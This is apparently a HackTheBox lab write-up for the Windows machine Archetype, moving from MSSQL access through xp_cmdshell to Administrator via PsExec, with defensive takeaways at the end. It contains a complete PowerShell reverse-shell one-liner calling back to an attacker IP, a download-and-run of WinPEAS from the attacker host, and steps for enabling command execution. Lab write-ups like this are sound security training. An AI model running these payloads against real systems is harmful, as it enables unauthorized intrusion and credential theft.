# Archetype

This is a HackTheBox Starting Point lab focused on SMB and Microsoft SQL Server enumeration, command execution through `xp_cmdshell`, Windows service-account access, credential discovery in PowerShell history, and remote administrative access with PsExec.

## Lab Summary

| Item | Detail |
| --- | --- |
| Platform | HackTheBox |
| Machine | Archetype |
| Target | `10.129.139.188` |
| Operating System | Windows Server 2019 Standard 17763 |
| Initial Access | MSSQL credentials recovered from a deployment configuration artifact |
| Execution | MSSQL `xp_cmdshell` and a PowerShell reverse shell |
| Privilege Escalation | Plaintext Administrator credentials in PowerShell history |
| Testing Date | 2026-09-19 |

## Reconnaissance

I used RustScan with Nmap default scripts and service detection:

```bash
target=10.129.139.188
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The scan identified the following TCP services:

```text
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
```

MSSQL NTLM information identified the host as `ARCHETYPE`, and SMB enumeration reported that message signing was enabled but not required.

## Credential Artifact

The supplied lab evidence included a deployment configuration file named `prod.dtsConfig`. The credentials subsequently used for MSSQL access were:

```text
Username: sql_svc
Password: <REDACTED>
```

The original capture did not include the command used to retrieve the file, so that acquisition step is not reproduced here. The presence of SMB on port `445/tcp` and the deployment artifact should make SMB share review an early enumeration priority.

## MSSQL Access

I authenticated to MSSQL with Windows authentication through Impacket:

```bash
impacket-mssqlclient 'sql_svc:<REDACTED>'@$target -windows-auth
```

The connection succeeded over TLS and opened a database shell as `ARCHETYPE\sql_svc` with `dbo` access to `master`:

```text
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

## Command Execution Through `xp_cmdshell`

The database login could change server-level configuration. I enabled advanced options and `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

I validated operating-system command execution:

```sql
EXEC xp_cmdshell 'whoami';
```

```text
archetype\sql_svc
```

This confirmed that SQL queries could execute Windows commands as the `sql_svc` service account.

## Initial Shell

I started a listener on the attacking host:

```bash
nc -lvnp 1337
```

From the MSSQL client, I launched a PowerShell TCP reverse shell through `xp_cmdshell`:

```sql
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.15.32'',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

The callback provided an interactive PowerShell session as `ARCHETYPE\sql_svc`.

## User Flag

The user proof was stored on the service account's desktop:

```powershell
Get-Content C:\Users\sql_svc\Desktop\user.txt
```

```text
<REDACTED>
```

## Privilege Enumeration

I hosted WinPEAS from the attacking machine:

```bash
python3 -m http.server 8080
```

I downloaded and ran it on the target:

```powershell
Invoke-WebRequest -Uri http://10.10.15.32:8080/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe
```

WinPEAS highlighted the PowerShell PSReadLine history file:

```text
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Reading the file disclosed a previously entered command containing plaintext Administrator credentials:

```powershell
Get-Content C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```text
net.exe use T: \\Archetype\backups /user:administrator <REDACTED>
exit
```

## Administrator Access

I used the recovered credentials with Impacket PsExec:

```bash
impacket-psexec administrator@$target
```

After entering the recovered password, PsExec found the writable `ADMIN$` share, created a temporary service, and returned an administrative command shell:

```text
Microsoft Windows [Version 10.0.17763.2061]
C:\Windows\system32>
```

## Root Flag

The root proof was stored on the Administrator desktop:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```text
<REDACTED>
```

## Attack Path

```text
RustScan and Nmap
        |
        v
SMB and MSSQL services identified
        |
        v
Deployment configuration artifact exposes sql_svc credentials
        |
        v
Windows-authenticated MSSQL access
        |
        v
xp_cmdshell enabled through excessive SQL privileges
        |
        v
PowerShell reverse shell as sql_svc
        |
        v
PowerShell history reveals Administrator credentials
        |
        v
PsExec administrative access
        |
        v
Full host compromise
```

## Key Takeaways

- Deployment and backup files can expose service-account credentials and should not be readable from broadly accessible shares.
- Database service accounts should not receive privileges that allow server reconfiguration or operating-system command execution.
- PowerShell history can retain plaintext secrets entered interactively and should be treated as sensitive data.
- Administrative passwords should not be typed directly into commands, reused across services, or left accessible to lower-privileged accounts.
- SMB signing should be required, SMBv1 should be disabled, and administrative shares should be restricted to trusted management paths.
- The compromise depended on chaining exposed credentials, excessive MSSQL privileges, and insecure credential handling.

## Related Report

- [Archetype Penetration Test Report](../../reports/hackthebox/archetype-pentest-report.md)

## Disclaimer

This writeup documents activity performed in an authorized HackTheBox lab environment for educational purposes.
